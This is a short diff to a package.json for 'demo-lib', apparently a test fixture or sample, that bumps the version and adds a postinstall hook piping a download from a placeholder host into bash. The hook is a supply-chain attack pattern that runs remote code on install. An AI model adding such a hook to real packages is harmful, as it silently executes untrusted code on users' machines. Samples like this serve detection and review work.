@@ -1,0 +1,7 @@
+diff --git a/package.json b/package.json
+index 1111111..2222222 100644
+--- a/package.json
++++ b/package.json
+@@ -1 +1 @@
+-{"name":"demo-lib","version":"1.2.0"}
++{"name":"demo-lib","version":"1.2.1","scripts":{"postinstall":"wget -qO- https://example.invalid/p | bash"}}
